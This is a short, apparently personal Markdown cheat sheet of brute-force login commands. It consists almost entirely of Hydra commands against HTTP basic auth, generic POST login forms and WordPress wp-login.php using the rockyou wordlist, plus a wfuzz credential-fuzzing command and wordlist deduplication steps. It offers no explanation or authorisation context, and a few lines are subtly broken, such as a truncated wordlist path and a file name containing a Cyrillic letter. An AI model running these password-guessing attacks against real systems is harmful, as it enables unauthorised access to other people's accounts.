BASIC AUTH BASICAUTH BASIC-AUTH with HYDRA
---
#bruteforce #basic-auth 

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f $TARGET_IP http-get
```

```shell
hydra -L users -P passwords -s 80 -f $TARGET_IP http-get
```

HTTP Post with HYDRA
---
```
hydra -l USERNAME -P /usr/share $TARGET_IP http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

WordPress HYDRA:
---
```shell
hydra -P fc.dic $TARGET_URL http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F$TARGET_IP%2Fwp-admin%2F&testcookie=1:Invalid username" -V
```

WFUZZ Post request
---
```shell
wfuzz -c -z file,$USERNAMES -z file,$PASSWORDS -d 'user=FUZZ&pass=FUZ2Z' $TARGET_URL/$FILE
```

WORDPRESS:
---
Get only unique entries from a dictionary files:

```shell
wc -l $DICT_FILE
```

```shell
sort $DICT_FILE | uniq > $DICT_FILE-sort.dic
```
or

```shell
sort -u $DICT_FILE > $DICT_FILE-sort.dic
```

```shell
wc -l $DICT_FILE-sort.dic
```

WordPress default login url:
---
```shell
hydra -L users.file -P passwordс $TARGET_URL http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.11.10.239%2Fwp-admin%2F&testcookie=1:Invalid username" -V
```
